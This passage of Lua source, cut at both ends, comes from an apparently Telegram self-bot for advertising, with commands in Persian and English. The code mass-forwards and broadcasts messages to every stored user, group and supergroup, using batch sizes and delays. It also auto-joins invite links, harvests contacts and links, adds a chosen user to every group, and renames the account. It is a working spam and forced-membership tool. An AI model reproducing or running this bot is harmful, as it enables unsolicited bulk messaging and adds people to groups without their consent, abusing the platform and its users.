]] .. tostring(offjoin) .. " \216\185\216\182\217\136\219\140\216\170 \216\174\217\136\216\175\218\169\216\167\216\177 \240\159\154\128\n" .. openjoin .. " \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\185\216\182\217\136\219\140\216\170 \216\168\216\167\216\178\n" .. tostring(offlink) .. " \216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169 \216\174\217\136\216\175\218\169\216\167\216\177 \240\159\154\166\n" .. tostring(nlink) .. " \216\170\216\180\216\174\219\140\216\181 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\185\216\182\217\136\219\140\216\170 \240\159\142\175\n" .. tostring(fwd) .. " \216\178\217\133\216\167\217\134\216\168\217\134\216\175\219\140 \216\175\216\177 \216\167\216\177\216\179\216\167\217\132 \240\159\143\129\n" .. tostring(contacts) .. " \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\217\136\216\175\218\169\216\167\216\177 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \226\158\149\n" .. tostring(autoanswer) .. " \216\173\216\167\217\132\216\170 \217\190\216\167\216\179\216\174\218\175\217\136\219\140\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \240\159\151\163 \n" .. tostring(numadd) .. " \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \216\168\216\167 \216\180\217\133\216\167\216\177\217\135 \240\159\147\158 \n" .. tostring(msgadd) .. " \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \216\168\216\167 \217\190\219\140\216\167\217\133 \240\159\151\158\n\227\128\176\227\128\176\227\128\176\216\167\227\128\176\227\128\176\227\128\176\n\240\159\147\132 \217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 :\n\240\159\147\141 " .. tostring(txtadd) .. " \240\159\147\141\n\227\128\176\227\128\176\227\128\176\216\167\227\128\176\227\128\176\227\128\176\n\n\226\143\171 \216\179\217\130\217\129 \216\170\216\185\216\175\216\167\216\175 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\135\216\167 : " .. tostring(gp) .. "\n\226\143\172 \218\169\217\133\216\170\216\177\219\140\217\134 \216\170\216\185\216\175\216\167\216\175 \216\167\216\185\216\182\216\167\219\140 \218\175\216\177\217\136\217\135 : " .. tostring(mmbrs) .. "\n\n\216\175\216\179\216\170\217\135 \216\168\217\134\216\175\219\140 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\216\177\216\167\219\140 \216\185\217\133\217\132\219\140\216\167\216\170 \216\178\217\133\216\167\217\134\219\140 : " .. max_i .. "\n\217\136\217\130\217\129\217\135 \216\178\217\133\216\167\217\134\219\140 \216\168\219\140\217\134 \216\167\217\133\217\136\216\177 \216\170\216\167\216\174\219\140\216\177\219\140 : " .. delay .. "\n\n\216\167\216\178 \216\179\216\177\218\175\219\140\216\177\219\140 \216\177\216\168\216\167\216\170 \216\168\216\185\216\175 \216\167\216\178 : " .. restart .. "\n\n\240\159\147\129 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 : " .. tostring(links) .. "\n\226\143\178\t\217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\175\216\177 \216\167\217\134\216\170\216\184\216\167\216\177 \216\185\216\182\217\136\219\140\216\170 : " .. tostring(glinks) .. "\n\240\159\149\150   " .. tostring(s) .. " \216\171\216\167\217\134\219\140\217\135 \216\170\216\167 \216\185\216\182\217\136\219\140\216\170 \217\133\216\172\216\175\216\175\n\226\157\132\239\184\143 \217\132\219\140\217\134\218\169 \217\135\216\167\219\140 \216\175\216\177 \216\167\217\134\216\170\216\184\216\167\216\177 \216\170\216\167\219\140\219\140\216\175 : " .. tostring(wlinks) .. "\n\240\159\149\145\239\184\143   " .. tostring(ss) .. [[



tgChannel =>  ..
Publisher =>   ..]]
              return send(msg.chat_id, 0, text)
            end
            if text:match("^([Ii]nfo)$") or text:match("^([Pp]anel)$") then
              local text2 = "Super groups => " .. tostring(sgps) .. [[

Groups => ]] .. tostring(gps) .. [[

Peesonal chat => ]] .. tostring(usrs) .. [[

contacts => ]] .. tostring(contacts) .. [[

Saved links => ]] .. tostring(links) .. [[

Links waiting for membership => ]] .. tostring(glinks) .. [[


Automatic membership => ]] .. tostring(offjoin) .. [[

Open membership groups =>  ]] .. tostring(openjoin) .. [[

Auto link confirmation => ]] .. tostring(offlink) .. [[

Detect membership links => ]] .. tostring(nlink) .. [[

Schedule on posting => ]] .. tostring(fwd) .. [[

Maximum Super Group => ]] .. tostring(gp) .. [[

The minimum number of members => ]] .. tostring(mmbrs) .. [[


Automatically add contacts => ]] .. tostring(contacts) .. [[

Add contact with number =>  ]] .. tostring(numadd) .. [[

Add contact by message => ]] .. tostring(msgadd) .. [[

Add contact message => ]] .. tostring(txtadd) .. [[



Grouping Groups for Timed Operation => ]] .. tostring(max_i) .. [[

Time lag between delays => ]] .. tostring(delay) .. [[

Seconds to re-join => ]] .. tostring(s) .. [[

Links waiting to be confirmed => ]] .. tostring(wlinks) .. [[

Seconds to confirm re-linking => ]] .. tostring(ss) .. [[

Restarting the robot after => ]] .. tostring(restart) .. [[



tgChannel =>  ..
Publisher =>   ..]]
              return send(msg.chat_id, 0, text2)
            end
          elseif text:match("^([Gg]p[Dd]elay) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":sendmax", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\170\216\185\216\175\216\167\216\175 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\219\140\217\134 \217\136\217\130\217\129\217\135 \217\135\216\167\219\140 \216\178\217\133\216\167\217\134\219\140 \216\167\216\177\216\179\216\167\217\132 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 " .. matches)
          elseif text:match("^([Ss]et[Dd]elay) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":senddelay", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \217\136\217\130\217\129\217\135 \216\168\219\140\217\134 \216\167\216\177\216\179\216\167\217\132 \217\135\216\167 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 " .. matches)
          elseif text:match("^(\216\167\216\177\216\179\216\167\217\132 \216\168\217\135) (.*)$") and msg.reply_to_message_id ~= 0 then
            local matches = text:match("^\216\167\216\177\216\179\216\167\217\132 \216\168\217\135 (.*)$")
            local tg
            if matches:match("^(\217\135\217\133\217\135)") then
              tg = "tg:" .. Ads_id .. ":all"
            elseif matches:match("^(\216\174\216\181\217\136\216\181\219\140)") then
              tg = "tg:" .. Ads_id .. ":users"
            elseif matches:match("^(\218\175\216\177\217\136\217\135)$") then
              tg = "tg:" .. Ads_id .. ":groups"
            elseif matches:match("^(\216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135)$") then
              tg = "tg:" .. Ads_id .. ":supergroups"
            else
              return true
            end
            local list = redis:smembers(tg)
            local id = msg.reply_to_message_id
            if redis:get("tg:" .. Ads_id .. ":fwdtime") then
              local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
              local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
              local during = #list / tonumber(max_i) * tonumber(delay)
              send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
              redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
              assert(tdbot_function({
                _ = "forwardMessages",
                chat_id = tonumber(list[1]),
                from_chat_id = msg.chat_id,
                message_ids = {
                  [0] = id
                },
                disable_notification = 0,
                from_background = 1
              }, forwarding, {
                list = list,
                max_i = max_i,
                delay = delay,
                n = 1,
                all = #list,
                chat_id = msg.chat_id,
                msg_id = id,
                s = 0
              }))
            else
              for i, v in pairs(list) do
                assert(tdbot_function({
                  _ = "forwardMessages",
                  chat_id = tonumber(v),
                  from_chat_id = msg.chat_id,
                  message_ids = {
                    [0] = id
                  },
                  disable_notification = 0,
                  from_background = 1
                }, dl_cb, nil))
              end
              return send(msg.chat_id, msg.id, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \217\129\216\177\216\179\216\170\216\167\216\175\217\135 \216\180\216\175")
            end
          elseif text:match("^(\216\167\216\177\216\179\216\167\217\132 \216\178\217\133\216\167\217\134\219\140) (.*)$") then
            local matches = text:match("^\216\167\216\177\216\179\216\167\217\132 \216\178\217\133\216\167\217\134\219\140 (.*)$")
            if matches == "\216\177\217\136\216\180\217\134" then
              redis:set("tg:" .. Ads_id .. ":fwdtime", true)
              return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \216\168\217\134\216\175\219\140 \216\167\216\177\216\179\216\167\217\132 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("tg:" .. Ads_id .. ":fwdtime")
              return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \216\168\217\134\216\175\219\140 \216\167\216\177\216\179\216\167\217\132 \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            end
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \216\170\216\185\216\175\216\167\216\175) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":sendmax", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\170\216\185\216\175\216\167\216\175 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\219\140\217\134 \217\136\217\130\217\129\217\135 \217\135\216\167\219\140 \216\178\217\133\216\167\217\134\219\140 \216\167\216\177\216\179\216\167\217\132 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 " .. matches)
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \217\136\217\130\217\129\217\135) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":senddelay", tonumber(matches))
            return send(msg.chat_id, msg.id, "\216\178\217\133\216\167\217\134 \217\136\217\130\217\129\217\135 \216\168\219\140\217\134 \216\167\216\177\216\179\216\167\217\132 \217\135\216\167 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135 " .. matches)
          elseif text:match("^(\216\167\216\177\216\179\216\167\217\132 \216\168\217\135 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135) (.*)") then
            local matches = text:match("^\216\167\216\177\216\179\216\167\217\132 \216\168\217\135 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 (.*)")
            local dir = redis:smembers("tg:" .. Ads_id .. ":supergroups")
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            local during = #dir / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = tonumber(dir[1]),
              reply_to_message_id = msg.id,
              disable_notification = 0,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "inputMessageText",
                text = tostring(matches),
                disable_web_page_preview = true,
                clear_draft = false,
                entities = {},
                parse_mode = nil
              }
            }, sending, {
              list = dir,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #dir,
              chat_id = msg.chat_id,
              text = matches,
              s = 0
            }))
          elseif text:match("^([Ff][Ww][Dd]) (.*)$") and msg.reply_to_message_id ~= 0 then
            local matches = text:match("^[Ff][Ww][Dd] (.*)$")
            local t
            if matches:match("^(all)") then
              t = "tg:" .. Ads_id .. ":all"
            elseif matches:match("^(pv)") then
              t = "tg:" .. Ads_id .. ":users"
            elseif matches:match("^(gp)$") then
              t = "tg:" .. Ads_id .. ":groups"
            elseif matches:match("^(sgp)$") then
              t = "tg:" .. Ads_id .. ":supergroups"
            else
              return true
            end
            local list = redis:smembers(t)
            local id = msg.reply_to_message_id
            if redis:get("tg:" .. Ads_id .. ":fwdtime") then
              local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
              local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
              local during = #list / tonumber(max_i) * tonumber(delay)
              send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
              redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
              assert(tdbot_function({
                _ = "forwardMessages",
                chat_id = tonumber(list[1]),
                from_chat_id = msg.chat_id,
                message_ids = {
                  [0] = id
                },
                disable_notification = 0,
                from_background = 1
              }, forwarding, {
                list = list,
                max_i = max_i,
                delay = delay,
                n = 1,
                all = #list,
                chat_id = msg.chat_id,
                msg_id = id,
                s = 0
              }))
              return send(msg.chat_id, msg.id, "Send")
            end
          elseif text:match("^([Ss]end)") and 0 < tonumber(msg.reply_to_message_id) then
            function tgM(tdtg, Ac)
              local xt = Ac.content.text
              local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
              send(msg.chat_id, msg.id, "waiting ...")
              for k, v in pairs(list) do
                os.execute("sleep " .. tonumber(3))
                assert(tdbot_function({
                  _ = "sendMessage",
                  chat_id = tonumber(v),
                  reply_to_message_id = 0,
                  disable_notification = 0,
                  from_background = 1,
                  reply_markup = nil,
                  input_message_content = {
                    _ = "inputMessageText",
                    text = tostring(xt),
                    disable_web_page_preview = 1,
                    clear_draft = 0,
                    parse_mode = nil,
                    entities = {}
                  }
                }, cb or dl_cb, nil))
                assert(tdbot_function({
                  _ = "getMessage",
                  chat_id = msg.chat_id,
                  message_id = msg.reply_to_message_id
                }, tgM))
              end
              return send(msg.chat_id, msg.id, "Done\226\153\187\239\184\143")
            end
          elseif text:match("^([Ss]end) (.*)") then
            local matches = text:match("^[Ss]end (.*)")
            local dir = redis:smembers("tg:" .. Ads_id .. ":supergroups")
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            local during = #dir / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = tonumber(dir[1]),
              reply_to_message_id = msg.id,
              disable_notification = 0,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "inputMessageText",
                text = tostring(matches),
                disable_web_page_preview = true,
                clear_draft = false,
                entities = {},
                parse_mode = nil
              }
            }, sending, {
              list = dir,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #dir,
              chat_id = msg.chat_id,
              text = matches,
              s = 0
            }))
          elseif text:match("^([Ll]eft) (.*)$") then
            local matches = text:match("^[Ll]eft (.*)$")
            if matches == "all" then
              for i, v in pairs(redis:smembers("tg:" .. Ads_id .. ":supergroups")) do
                assert(tdbot_function({
                  _ = "changeChatMemberStatus",
                  chat_id = tonumber(v),
                  user_id = bot_id,
                  status = {
                    _ = "chatMemberStatusLeft"
                  }
                }, cb or dl_cb, nil))
              end
            else
              send(msg.chat_id, msg.id, "\216\177\216\168\216\167\216\170 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\174\216\167\216\177\216\172 \216\180\216\175")
              assert(tdbot_function({
                _ = "changeChatMemberStatus",
                chat_id = matches,
                user_id = bot_id,
                status = {
                  _ = "chatMemberStatusLeft"
                }
              }, cb or dl_cb, nil))
              return rem(matches)
            end
          elseif text:match("^([Aa]dd[Tt]o[Aa]ll) @(.*)$") then
            local matches = text:match("^[Aa]dd[Tt]o[Aa]ll @(.*)$")
            local list = {
              redis:smembers("tg:" .. Ads_id .. ":groups"),
              redis:smembers("tg:" .. Ads_id .. ":supergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            print(#l)
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = matches
            }, function(I, t)
              if t.id then
                tdbot_function({
                  _ = "addChatMember",
                  chat_id = tonumber(I.list[tonumber(I.n)]),
                  user_id = t.id,
                  forward_limit = 0
                }, adding({
                  list = I.list,
                  max_i = I.max_i,
                  delay = I.delay,
                  n = tonumber(I.n),
                  all = I.all,
                  chat_id = I.chat_id,
                  user_id = I.user_id,
                  s = I.s
                }))
              end
            end, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
          elseif text:match("^(\216\185\216\182\217\136\219\140\216\170) (.*)$") then
            local matches = text:match("^\216\185\216\182\217\136\219\140\216\170 (.*)$")
            function joinchannel(extra, tb)
              print(vardump(tb))
              if tb._ == "ok" then
                send(msg.chat_id, msg.id, "\226\156\133")
              else
                send(msg.chat_id, msg.id, "failure")
              end
            end
            tdbot_function({
              _ = "importChatInviteLink",
              invite_link = matches
            }, joinchannel, nil)
          elseif text:match("^(\216\162\217\129\217\132\216\167\219\140\217\134) (%d+)$") then
            local matches = text:match("%d+")
            os.execute("sleep " .. tonumber(math.floor(matches) * 60))
            return send(msg.chat_id, msg.id, "hi")
          elseif text:match("^([Jj]oin) (.*)$") then
            local matches = text:match("^[Jj]oin (.*)$")
            function joinchannel(extra, tb)
              print(vardump(tb))
              if tb._ == "ok" then
                send(msg.chat_id, msg.id, "\226\156\133")
              else
                send(msg.chat_id, msg.id, "failure")
              end
            end
            tdbot_function({
              _ = "importChatInviteLink",
              invite_link = matches
            }, joinchannel, nil)
          elseif text:match("^([Ss]leep) (%d+)$") then
            local matches = text:match("%d+")
            os.execute("sleep " .. tonumber(math.floor(matches) * 60))
            return send(msg.chat_id, msg.id, "hi")
          elseif text:match("^([Bb]lock) (%d+)$") then
            local matches = text:match("%d+")
            rem(tonumber(matches))
            redis:sadd("tg:" .. Ads_id .. ":blockedusers", matches)
            tdbot_function({
              _ = "blockUser",
              user_id = tonumber(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
          elseif text:match("^([Uu]n[Bb]lock) (%d+)$") then
            local matches = text:match("%d+")
            add(tonumber(matches))
            redis:srem("tg:" .. Ads_id .. ":blockedusers", matches)
            tdbot_function({
              _ = "unblockUser",
              user_id = tonumber(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\217\133\216\179\216\175\217\136\216\175\219\140\216\170 \218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\177\217\129\216\185 \216\180\216\175.")
          elseif text:match("^([Ss]et[Nn]ame) \"(.*)\" (.*)") then
            local fname, lname = text:match("^[Ss]et[Nn]ame \"(.*)\" (.*)")
            tdbot_function({
              _ = "changeName",
              first_name = fname,
              last_name = lname
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\217\134\216\167\217\133 \216\172\216\175\219\140\216\175 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\171\216\168\216\170 \216\180\216\175.")
          elseif text:match("^([Ss]et[Uu]ser[Nn]ame) (.*)") then
            local matches = text:match("^[Ss]et[Uu]ser[Nn]ame (.*)")
            tdbot_function({
              _ = "changeUsername",
              username = tostring(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, 0, "\216\170\217\132\216\167\216\180 \216\168\216\177\216\167\219\140 \216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140...")
          elseif text:match("^(\217\133\216\179\216\175\217\136\216\175\219\140\216\170) (%d+)$") then
            local matches = text:match("%d+")
            rem(tonumber(matches))
            redis:sadd("tg:" .. Ads_id .. ":blockedusers", matches)
            tdbot_function({
              _ = "blockUser",
              user_id = tonumber(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \217\133\216\179\216\175\217\136\216\175 \216\180\216\175")
          elseif text:match("^(\216\177\217\129\216\185 \217\133\216\179\216\175\217\136\216\175\219\140\216\170) (%d+)$") then
            local matches = text:match("%d+")
            add(tonumber(matches))
            redis:srem("tg:" .. Ads_id .. ":blockedusers", matches)
            tdbot_function({
              _ = "unblockUser",
              user_id = tonumber(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\217\133\216\179\216\175\217\136\216\175\219\140\216\170 \218\169\216\167\216\177\216\168\216\177 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\177\217\129\216\185 \216\180\216\175.")
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133) \"(.*)\" (.*)") then
            local fname, lname = text:match("^\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \"(.*)\" (.*)")
            tdbot_function({
              _ = "changeName",
              first_name = fname,
              last_name = lname
            }, cb or dl_cb, nil)
            return send(msg.chat_id, msg.id, "\217\134\216\167\217\133 \216\172\216\175\219\140\216\175 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\171\216\168\216\170 \216\180\216\175.")
          elseif text:match("^(\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140) (.*)") then
            local matches = text:match("^\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140 (.*)")
            tdbot_function({
              _ = "changeUsername",
              username = tostring(matches)
            }, cb or dl_cb, nil)
            return send(msg.chat_id, 0, "\216\170\217\132\216\167\216\180 \216\168\216\177\216\167\219\140 \216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140...")
          elseif text:match("^(\216\173\216\176\217\129 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140)$") or text:match("^([Dd]el[Uu]ser[Nn]ame)$") then
            tdbot_function({
              _ = "changeUsername",
              username = ""
            }, cb or dl_cb, nil)
            return send(msg.chat_id, 0, "\217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\173\216\176\217\129 \216\180\216\175.")
          elseif text:match("^(\216\167\216\177\216\179\216\167\217\132 \218\169\217\134) \"(.*)\" (.*)") then
            local id, txt = text:match("^\216\167\216\177\216\179\216\167\217\132 \218\169\217\134 \"(.*)\" (.*)")
            send(id, 0, txt)
            return send(msg.chat_id, msg.id, "\216\167\216\177\216\179\216\167\217\132 \216\180\216\175")
          elseif text:match("^(\216\168\218\175\217\136) (.*)") then
            local matches = text:match("^\216\168\218\175\217\136 (.*)")
            return send(msg.chat_id, 0, matches)
          elseif text:match("^(\216\180\217\134\216\167\216\179\217\135 \217\133\217\134)$") or text:match("^([Ii][Dd])$") then
            return send(msg.chat_id, msg.id, msg.sender_user_id)
          elseif text:match("^(\216\170\216\177\218\169 \218\169\216\177\216\175\217\134) (.*)$") then
            local matches = text:match("^\216\170\216\177\218\169 \218\169\216\177\216\175\217\134 (.*)$")
            if matches == "\217\135\217\133\217\135" then
              for i, v in pairs(redis:smembers("tg:" .. Ads_id .. ":supergroups")) do
                assert(tdbot_function({
                  _ = "changeChatMemberStatus",
                  chat_id = tonumber(v),
                  user_id = bot_id,
                  status = {
                    _ = "chatMemberStatusLeft"
                  }
                }, cb or dl_cb, nil))
              end
            else
              send(msg.chat_id, msg.id, "\216\177\216\168\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133 \216\167\216\175\216\178 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \216\174\216\167\216\177\216\172 \216\180\216\175")
              assert(tdbot_function({
                _ = "changeChatMemberStatus",
                chat_id = matches,
                user_id = bot_id,
                status = {
                  _ = "chatMemberStatusLeft"
                }
              }, cb or dl_cb, nil))
              return rem(matches)
            end
          elseif text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\217\135 \217\135\217\133\217\135) @(.*)$") then
            local matches = text:match("^\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\217\135 \217\135\217\133\217\135 @(.*)$")
            local list = {
              redis:smembers("tg:" .. Ads_id .. ":groups"),
              redis:smembers("tg:" .. Ads_id .. ":supergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 2 .. Ads_id
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 1 .. Ads_id
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            print(#l)
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = matches
            }, function(I, tg)
              if tg.id then
                tdbot_function({
                  _ = "addChatMember",
                  chat_id = tonumber(I.list[tonumber(I.n)]),
                  user_id = tg.id,
                  forward_limit = 0
                }, adding({
                  list = I.list,
                  max_i = I.max_i,
                  delay = I.delay,
                  n = tonumber(I.n),
                  all = I.all,
                  chat_id = I.chat_id,
                  user_id = I.user_id,
                  s = I.s
                }))
              end
            end, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
          elseif text:match("^(\216\167\217\134\217\132\216\167\219\140\217\134)$") and not msg.forward_info or text:match("^(\216\162\217\134\217\132\216\167\219\140\217\134)$") and not msg.forward_info or text:match("^([Pp]ing)$") and not msg.forward_info then
            return tdbot_function({
              _ = "forwardMessages",
              chat_id = msg.chat_id,
              from_chat_id = msg.chat_id,
              message_ids = {
                [0] = msg.id
              },
              disable_notification = 0,
              from_background = 1
            }, dl_cb, nil)
          elseif text:match("^(\216\177\216\167\217\135\217\134\217\133\216\167)$") then
